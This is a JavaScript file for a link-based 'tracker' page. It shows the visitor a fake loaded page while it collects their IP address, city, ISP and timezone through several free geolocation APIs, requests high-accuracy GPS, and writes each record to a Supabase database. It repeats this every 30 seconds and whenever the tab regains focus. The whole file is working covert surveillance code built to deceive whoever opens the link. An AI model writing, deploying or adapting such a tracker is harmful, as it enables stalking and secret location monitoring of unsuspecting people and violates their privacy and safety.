// ═══════════════════════════════════════════════════════════
// TRACKER — captures IP + location, writes to Supabase
// ═══════════════════════════════════════════════════════════

(() => {
  'use strict';

  const db = getSupabase();
  const PING_INTERVAL = 30_000; // 30 seconds
  let sessionId = null;

  // ── Get session ID from URL ──────────────────
  function getSessionId() {
    const params = new URLSearchParams(window.location.search);
    return params.get('s') || params.get('id');
  }

  // ── Check if session is valid and active ─────
  async function isSessionActive(id) {
    const { data, error } = await db
      .from('sessions')
      .select('is_active')
      .eq('id', id)
      .single();

    return data?.is_active === true;
  }

  // ── Get IP + Geolocation from free APIs ──────
  async function getIPLocation() {
    // Try ipwho.is first (free, no key, CORS enabled)
    try {
      const res = await fetch('https://ipwho.is/');
      if (res.ok) {
        const d = await res.json();
        if (d.success !== false) {
          return {
            ip: d.ip,
            latitude: d.latitude,
            longitude: d.longitude,
            city: d.city,
            region: d.region,
            country: d.country,
            isp: d.connection?.isp || d.connection?.org || 'Unknown',
            timezone: d.timezone?.id || 'Unknown',
          };
        }
      }
    } catch (e) {
      console.debug('ipwho.is failed:', e.message);
    }

    // Fallback: ipapi.co
    try {
      const res = await fetch('https://ipapi.co/json/');
      if (res.ok) {
        const d = await res.json();
        return {
          ip: d.ip,
          latitude: d.latitude,
          longitude: d.longitude,
          city: d.city,
          region: d.region,
          country: d.country_name,
          isp: d.org || 'Unknown',
          timezone: d.timezone || 'Unknown',
        };
      }
    } catch (e) {
      console.debug('ipapi.co failed:', e.message);
    }

    // Fallback: freeipapi.com
    try {
      const res = await fetch('https://freeipapi.com/api/json/');
      if (res.ok) {
        const d = await res.json();
        return {
          ip: d.ipAddress,
          latitude: d.latitude,
          longitude: d.longitude,
          city: d.cityName,
          region: d.regionName,
          country: d.countryName,
          isp: 'Unknown',
          timezone: d.timeZone || 'Unknown',
        };
      }
    } catch (e) {
      console.debug('freeipapi.com failed:', e.message);
    }

    return null;
  }

  // ── Get GPS location (high accuracy) ─────────
  function getGPSLocation() {
    return new Promise(resolve => {
      if (!navigator.geolocation) { resolve(null); return; }

      navigator.geolocation.getCurrentPosition(
        pos => resolve({
          latitude: pos.coords.latitude,
          longitude: pos.coords.longitude,
          gpsAccuracy: pos.coords.accuracy,
        }),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
      );
    });
  }

  // ── Send ping to Supabase ────────────────────
  async function sendPing() {
    if (!sessionId) return;

    // Check session still active
    const active = await isSessionActive(sessionId);
    if (!active) { console.debug('Session inactive'); return; }

    // Get IP-based location
    const ipLoc = await getIPLocation();
    if (!ipLoc) { console.debug('Could not get IP location'); return; }

    // Try GPS for better accuracy
    const gps = await getGPSLocation();

    const record = {
      session_id: sessionId,
      ip: ipLoc.ip,
      latitude: gps?.latitude ?? ipLoc.latitude,
      longitude: gps?.longitude ?? ipLoc.longitude,
      city: ipLoc.city,
      region: ipLoc.region,
      country: ipLoc.country,
      isp: ipLoc.isp,
      timezone: ipLoc.timezone,
      accuracy: gps
        ? `gps (±${Math.round(gps.gpsAccuracy)}m)`
        : 'ip (~5-25km)',
      raw_data: { ip: ipLoc, gps: gps || null },
    };

    const { error } = await db.from('locations').insert(record);

    if (error) {
      console.debug('Failed to send ping:', error.message);
    } else {
      console.debug('📍 Location ping sent');
    }
  }

  // ── Fake "loaded" UI transition ──────────────
  function showFakeContent() {
    setTimeout(() => {
      const loading = document.getElementById('loading');
      const content = document.getElementById('content');
      if (loading) loading.style.display = 'none';
      if (content) content.classList.remove('loaded');
    }, 2500);
  }

  // ── Init ─────────────────────────────────────
  async function init() {
    sessionId = getSessionId();
    if (!sessionId) return;

    const active = await isSessionActive(sessionId);
    if (!active) return;

    showFakeContent();

    // First ping immediately
    await sendPing();

    // Periodic pings
    setInterval(sendPing, PING_INTERVAL);

    // Ping when user returns to tab
    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) sendPing();
    });
  }

  init();
})();